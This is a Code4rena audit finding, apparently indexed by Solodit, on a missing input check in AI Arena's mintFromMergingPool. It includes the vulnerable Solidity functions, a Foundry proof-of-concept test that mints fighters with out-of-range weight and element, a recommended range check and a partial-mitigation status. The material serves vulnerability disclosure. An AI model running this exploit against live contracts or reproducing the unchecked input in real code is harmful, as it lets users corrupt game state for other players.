---
# Core Classification
protocol: AI Arena
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 32193
audit_firm: Code4rena
contest_link: https://code4rena.com/reports/2024-02-ai-arena
source_link: https://code4rena.com/reports/2024-02-ai-arena
github_link: https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - gaming

# Audit Details
report_date: unknown
finders_count: 51
finders:
  - Tumelo\_Crypto
  - 0xvj
  - ahmedaghadi
  - kiqo
  - Tendency
---

## Vulnerability Title

[M-03] Fighter created by `mintFromMergingPool` can have arbitrary weight and element

### Overview


The bug report discusses an issue in the code of the AI Arena game, specifically in the FighterFarm and MergingPool contracts. The problem is that when creating fighters through the mintFromMergingPool function, there is no check on the input values for weight and element, which can result in fighters with arbitrary and potentially harmful values. This could have a negative impact on battles within the game. The report includes a proof of concept and a recommended mitigation step of checking and restricting the input values for weight and element. The issue has been confirmed and partially mitigated by the AI Arena team, but further reports have found that the mitigation is not fully effective.

### Original Finding Content


<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L313-L331><br>
<https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L139-L167>

*   Fighter created by mintFromMergingPool can have arbitrary weight and element like 0 or 2&ast;&ast;256 - 1
*   Invalid weight and element could greatly affect AI Arena battles.

### Proof of Concept

When someone claim their nft rewards from MergingPool, they can input `customeAttributes` and create fighters with arbitrary values since currently there is no check on `customeAttributes` and it could varies from 0 to 2&ast;&ast;256 - 1 (type(uint256).max):

<Details>

```solidity
function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes
    ) 
        external 
    {
     ....
        
             _fighterFarmInstance.mintFromMergingPool(
                        msg.sender,
                        modelURIs[claimIndex],
                        modelTypes[claimIndex],
                        customAttributes[claimIndex]
                    );
                   
          
    ....
    }

function mintFromMergingPool(
        address to, 
        string calldata modelHash, 
        string calldata modelType, 
        uint256[2] calldata customAttributes
    ) 
        public 
    {
        require(msg.sender == _mergingPoolAddress);
        _createNewFighter(
            to, 
            uint256(keccak256(abi.encode(msg.sender, fighters.length))), 
            modelHash, 
            modelType,
            0,
            0,
            customAttributes
        );
    }
```
</details>

This allow creating fighters with element and weight range from 0 to 2&ast;&ast;256 - 1 and can have negative impact on AI Arena matches according to the doc here <https://docs.aiarena.io/gaming-competition/nft-makeup>, for example:

*   Weight is described in the doc as `used to calculate how far the fighter moves when being knocked back.`. If an nft has extremely large weight like 2&ast;&ast;256- 1, then it could never be knocked back
*   Element can only be one of Fire, Electricity or Water, an nft with element outside of this list could be created.

Below is a POC, save the test case to contract `MergingPoolTest` under file `test/MergingPool.t.sol` and run it using command:
`forge test --match-path test/MergingPool.t.sol --match-test testClaimRewardsArbitraryElementAndWeight -vvvv`

<details>

```solidity
function testClaimRewardsArbitraryElementAndWeight() public {
        _mintFromMergingPool(_ownerAddress);
        _mintFromMergingPool(_DELEGATED_ADDRESS);
        assertEq(_fighterFarmContract.ownerOf(0), _ownerAddress);
        assertEq(_fighterFarmContract.ownerOf(1), _DELEGATED_ADDRESS);
        uint256[] memory _winners = new uint256[](2);
        _winners[0] = 0;
        _winners[1] = 1;
        // winners of roundId 0 are picked
        _mergingPoolContract.pickWinner(_winners);
        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);
        // winner matches ownerOf tokenId
        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == _DELEGATED_ADDRESS, true);
        string[] memory _modelURIs = new string[](2);
        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
        string[] memory _modelTypes = new string[](2);
        _modelTypes[0] = "original";
        _modelTypes[1] = "original";
        uint256[2][] memory _customAttributes = new uint256[2][](2);
        _customAttributes[0][0] = uint256(0);
        _customAttributes[0][1] = uint256(type(uint256).max);
        _customAttributes[1][0] = uint256(type(uint256).max);
        _customAttributes[1][1] = uint256(0);
        // winners of roundId 1 are picked
        _mergingPoolContract.pickWinner(_winners);
        // winner claims rewards for previous roundIds
        _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);

        // Fighter 2 has 2**256 weight and element = 0
        (, ,uint256 weight , uint256 element , , , ) = _fighterFarmContract.getAllFighterInfo(2);
        assertEq(weight, 2**256 - 1);
        assertEq(element, 0);

        // Fighter 3 has 0 weight and 2**256 element
        (, , weight ,  element , , , ) = _fighterFarmContract.getAllFighterInfo(3);
        assertEq(weight, 0);
        assertEq(element, 2**256 - 1);

    }
```

</details>

### Recommended Mitigation Steps

I recommend checking `customAttributes` in function `mintFromMergingPool` and only restrict `weight` and `element` in predefined ranges. For example, weight must be in range \[65, 95], element must be in range \[0,2].

**[brandinho (AI Arena) confirmed via duplicate issue \#1670](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1670#issuecomment-1985801932)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16

**Status:** Not fully mitigated. Full details in reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8) and niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/29), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/13)), and also included in the [Mitigation Review](#mitigation-review) section below.



***



### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Code4rena |
| Protocol | AI Arena |
| Report Date | N/A |
| Finders | Tumelo\_Crypto, 0xvj, ahmedaghadi, kiqo, Tendency, givn, Blank\_Space, cats, agadzhalov, MrPotatoMagic, Silvermist, klau5, juancito, ke1caM, visualbits, pkqs90, aslanbek, krikolkk, denzi\_, SpicyMeatball, haxatron, FloatingPragma, ktg, Topmark, Matue, d3e4, \_eperezok, immeas, handsomegiraffe, dutra, Draiakoo, 0xDetermination, yotov721, stakog, sl1, 0xWallSecurity, alexxander, BARW, 0xlemon, 0xRiO, evmboi32, McToady, vnavascues, Giorgio, fnanni, peter, niser93, rspadi, 0xCiphky, AlexCzm, petro\_1912 |

### Source Links

- **Source**: https://code4rena.com/reports/2024-02-ai-arena
- **GitHub**: https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932
- **Contest**: https://code4rena.com/reports/2024-02-ai-arena

### Keywords for Search

`vulnerability`

